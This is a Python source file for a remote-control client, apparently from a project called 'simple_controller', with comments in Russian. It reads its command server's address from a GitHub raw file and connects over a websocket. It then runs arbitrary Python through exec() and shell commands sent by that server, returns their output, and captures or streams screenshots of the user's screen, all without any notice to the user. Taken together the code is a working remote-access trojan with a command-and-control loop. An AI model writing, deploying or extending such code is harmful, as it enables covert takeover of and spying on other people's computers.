import asyncio
import websockets
import requests
import socket
import json
import subprocess
import os
import uuid
from io import BytesIO
import base64
import threading
import mss
from PIL import Image
# test
APPDATA_DIR = os.getenv("APPDATA") or os.path.expanduser("~/.config")
ID_FILE = os.path.join(APPDATA_DIR, "id.txt")

def get_client_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read().strip()
    cid = str(uuid.uuid4())
    with open(ID_FILE, "w") as f:
        f.write(cid)
    return cid

CLIENT_ID = get_client_id()

def get_address():
    url = "https://raw.githubusercontent.com/rustemtess/simple_controller/main/address.txt"
    try:
        return requests.get(url, timeout=5).text.strip()
    except:
        return None

def has_internet():
    try:
        requests.get("https://www.google.com", timeout=3)
        return True
    except requests.RequestException:
        return False

# Флаг управления стримом
stream_flag = {"running": False}

async def take_screenshot():
    """Скриншот с улучшенным качеством"""
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        sct_img = sct.grab(monitor)
        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
        img = img.resize((1280, 720))  # HD
        buffer = BytesIO()
        img.save(buffer, format="JPEG", quality=90)  # улучшенное качество
        encoded = base64.b64encode(buffer.getvalue()).decode()
        return encoded

async def send_screens(ws):
    """Поток для постоянной отправки скринов"""
    while stream_flag["running"]:
        try:
            encoded = await take_screenshot()
            await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))
        except Exception as e:
            await ws.send(json.dumps({"id": CLIENT_ID, "error": f"Screenshot error: {e}"}))
        await asyncio.sleep(0.3)  # ~5 FPS

async def connect_and_listen(address):
    async with websockets.connect(f"wss://{address}") as ws:
        await ws.send(json.dumps({"id": CLIENT_ID}))
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            to = data.get("to")
            if to not in ("all", CLIENT_ID):
                continue

            cmd_type = data.get("type")
            content = data.get("cmd")

            try:
                if cmd_type == "python":
                    exec(content, globals())
                    await ws.send(json.dumps({"id": CLIENT_ID, "output": "Python executed"}))

                elif cmd_type == "cmd":
                    result = subprocess.getoutput(content)
                    await ws.send(json.dumps({"id": CLIENT_ID, "output": result}))

                elif cmd_type == "screen":
                    encoded = await take_screenshot()
                    await ws.send(json.dumps({"id": CLIENT_ID, "screen": encoded}))

                elif cmd_type == "start_stream":
                    if not stream_flag["running"]:
                        stream_flag["running"] = True
                        asyncio.create_task(send_screens(ws))

                elif cmd_type == "stop_stream":
                    stream_flag["running"] = False

            except Exception as e:
                await ws.send(json.dumps({"id": CLIENT_ID, "error": str(e)}))

async def main():
    while True:
        if not has_internet():
            await asyncio.sleep(60)
            continue

        address = get_address()
        if not address:
            await asyncio.sleep(60)
            continue

        try:
            await connect_and_listen(address)
        except Exception:
            await asyncio.sleep(120)

if __name__ == "__main__":
    asyncio.run(main())
